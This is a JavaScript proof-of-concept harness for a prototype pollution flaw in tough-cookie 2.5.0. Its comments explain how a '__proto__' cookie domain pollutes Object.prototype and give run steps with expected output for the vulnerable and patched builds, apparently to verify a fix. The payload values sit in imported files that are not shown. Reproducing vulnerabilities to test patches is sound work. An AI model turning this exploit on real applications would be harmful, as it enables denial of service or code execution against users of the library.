/*
  This file demonstrates an exploit for the Prototype Pollution vulnerability in tough-cookie 2.5.0.

  Vulnerability Details:
   In tough-cookie 2.5.0, when creating a CookieJar with rejectPublicSuffixes=false,
   the internal store is built using objects that inherit from Object.prototype. This means
   that an attacker can set cookies with a domain like "__proto__" which pollutes the Object.prototype,
   causing every object in the application to inherit malicious properties. This can lead to
   denial-of-service or even remote code execution in certain contexts.

   Instructions:
     1. With vulnerable package:
        npm install tough-cookie@2.5.0 && node index.js
        Expected Output: "EXPLOITED SUCCESSFULLY"

     2. With patched package:
        npm install tough-cookie-2.5.0-PATCHED.tgz && node index.js
        Expected Output: "EXPLOIT FAILED"
*/

const {config, cookies} = require("./lib/config.js");
const {setCookies, isCookiePolluted, createVulnerableJar} = require("./lib/util.js");

const exploitPollution = async () => {
  try {
    // Create a vulnerable CookieJar instance.
    const jar = createVulnerableJar();
    // Set the cookies.
    await setCookies(jar, cookies);

    // Check if the prototype exploit worked.
    const obj = {};
    const pollutedObject = obj[config.cookiePath] && obj[config.cookiePath][config.exploitCookieName];
    isCookiePolluted(pollutedObject?.value);

  } catch (e) {
    console.log(`${config.exploitError}: ${e.message}`);
    console.log(config.exploitFailed);
  }
};

exploitPollution();
